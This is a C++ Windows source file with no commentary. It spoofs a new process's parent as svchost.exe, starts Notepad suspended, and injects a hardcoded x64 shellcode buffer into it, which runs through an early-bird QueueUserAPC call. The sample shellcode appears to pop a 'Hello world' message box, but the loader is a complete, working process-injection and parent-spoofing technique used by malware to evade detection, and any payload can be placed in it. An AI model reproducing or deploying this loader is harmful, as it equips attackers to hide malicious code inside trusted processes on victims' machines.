#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>

char shellcode[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

HANDLE GetSvchostProcessHandle() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    PROCESSENTRY32 process_entry;
    process_entry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &process_entry)) {
        CloseHandle(snapshot);
        return NULL;
    }

    do {
        if (wcscmp(process_entry.szExeFile, L"svchost.exe") == 0) {
            HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_entry.th32ProcessID);
            if (process_handle != NULL) {
                CloseHandle(snapshot);
                return process_handle;
            }
        }
    } while (Process32Next(snapshot, &process_entry));

    CloseHandle(snapshot);
    return NULL;
}

int spoofPID() {
    DWORD oldprot = 0;
    SIZE_T attribute_size = 0;
    STARTUPINFOEXA startup_info;
    PROCESS_INFORMATION process_info;

    ZeroMemory(&startup_info, sizeof(STARTUPINFOEXA));
    ZeroMemory(&process_info, sizeof(PROCESS_INFORMATION));
    startup_info.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    InitializeProcThreadAttributeList(NULL, 1, 0, &attribute_size);
    PPROC_THREAD_ATTRIBUTE_LIST attribute_list = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attribute_size);

    if (!attribute_list) {
        return 1;
    }

    if (!InitializeProcThreadAttributeList(attribute_list, 1, 0, &attribute_size)) {
        HeapFree(GetProcessHeap(), 0, attribute_list);
        return 1;
    }

    HANDLE process = GetSvchostProcessHandle();
    if (process == NULL) {
        HeapFree(GetProcessHeap(), 0, attribute_list);
        return 1;
    }

    if (!UpdateProcThreadAttribute(attribute_list, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &process, sizeof(HANDLE), NULL, NULL)) {
        CloseHandle(process);
        HeapFree(GetProcessHeap(), 0, attribute_list);
        return 1;
    }

    startup_info.lpAttributeList = attribute_list;

    if (!CreateProcessA(
        NULL,
        (LPSTR)"C:\\Program Files\\WindowsApps\\Microsoft.WindowsNotepad_11.2404.10.0_x64__8wekyb3d8bbwe\\Notepad\\Notepad.exe",
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        &startup_info.StartupInfo,
        &process_info
    )) {
        CloseHandle(process);
        HeapFree(GetProcessHeap(), 0, attribute_list);
        return 1;
    }

    LPVOID alloc_mem = VirtualAllocEx(process_info.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!alloc_mem) {
        return 1;
    }

    if (!WriteProcessMemory(process_info.hProcess, alloc_mem, shellcode, sizeof(shellcode), NULL)) {
        return 1;
    }

    if (!VirtualProtectEx(process_info.hProcess, alloc_mem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldprot)) {
        return 1;
    }

    QueueUserAPC((PAPCFUNC)alloc_mem, process_info.hThread, NULL);

    ResumeThread(process_info.hThread);

    WaitForSingleObject(process_info.hProcess, INFINITE);

    return 0;
}

int main() {
    return spoofPID();
}
